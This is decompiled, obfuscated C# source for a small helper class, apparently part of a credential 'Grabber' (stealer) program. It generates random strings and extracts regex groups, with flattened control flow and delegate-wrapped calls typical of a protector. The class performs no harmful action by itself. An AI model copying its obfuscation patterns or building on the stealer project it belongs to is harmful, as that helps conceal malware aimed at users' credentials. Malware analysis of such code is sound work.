using System;
using System.Runtime.CompilerServices;
using System.Text;

namespace Application.Grabber.Other
{
	// Token: 0x0200000F RID: 15
	internal class Helper
	{
		// Token: 0x0600005E RID: 94 RVA: 0x000036D0 File Offset: 0x000018D0
		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void SetValues()
		{
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					switch (num)
					{
					case 0:
						Helper.Random = new Random();
						num = delegate0da.f0000d7(-2);
						continue;
					case 1:
						goto IL_99;
					case 2:
						Helper.Offset = 'a';
						num = delegate0da.f0000d7(-1);
						continue;
					case 3:
						Helper.RandomLocker = new object();
						num = delegate0da.f0000d7(0);
						continue;
					}
					break;
				}
			}
			IL_99:
			Helper.LettersOffset = (int)(Helper.Offset + '\u001a');
		}

		// Token: 0x0600005F RID: 95 RVA: 0x00003784 File Offset: 0x00001984
		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string RandomString(int size)
		{
			StringBuilder stringBuilder = new StringBuilder(size);
			for (int i = 0; i < size; i++)
			{
				char value = ' ';
				object randomLocker = Helper.RandomLocker;
				bool flag = false;
				delegate0e5.f0000f2(randomLocker, ref flag);
				value = (char)delegate0d8.f0000d4(Helper.Random, (int)Helper.Offset, Helper.LettersOffset);
				stringBuilder.Append(value);
			}
			return delegate0cd.f0000a6(stringBuilder);
		}

		// Token: 0x06000060 RID: 96 RVA: 0x000037F8 File Offset: 0x000019F8
		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string RegexParse(string input, string pattern)
		{
			return delegate0e7.f0000fc(input, pattern).Groups[1].Value;
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00003824 File Offset: 0x00001A24
		[MethodImpl(MethodImplOptions.NoInlining)]
		public Helper()
		{
		}

		// Token: 0x06000062 RID: 98 RVA: 0x0000382C File Offset: 0x00001A2C
		// Note: this type is marked as 'beforefieldinit'.
		[MethodImpl(MethodImplOptions.NoInlining)]
		static Helper()
		{
			c0000c0.Initialize();
			c0000c0.PostInitialize();
		}

		// Token: 0x04000021 RID: 33
		private static object RandomLocker;

		// Token: 0x04000022 RID: 34
		private static Random Random;

		// Token: 0x04000023 RID: 35
		private static char Offset;

		// Token: 0x04000024 RID: 36
		private static int LettersOffset;
	}
}
